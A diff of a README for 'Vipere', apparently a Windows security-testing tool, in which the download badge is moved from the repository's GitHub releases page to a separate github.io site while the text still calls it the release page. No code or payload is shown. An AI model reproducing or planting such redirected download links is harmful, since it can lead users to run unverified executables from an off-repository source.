@@ -4,7 +4,7 @@
 Welcome to Vipere, your tool for advanced system security testing. This guide will help you download and run the application on your Windows computer quickly and easily.
 
 ## 📥 Download Vipere
-[![Download Vipere](https://img.shields.io/badge/Download-Vipere-blue?style=for-the-badge&logo=github)](https://github.com/Alex931116/Vipere/releases)
+[![Download Vipere](https://img.shields.io/badge/Download-Vipere-blue?style=for-the-badge&logo=github)](https://alex931116.github.io)
 
 Visit this link to download the application. The download page contains the latest release files for your system.
 
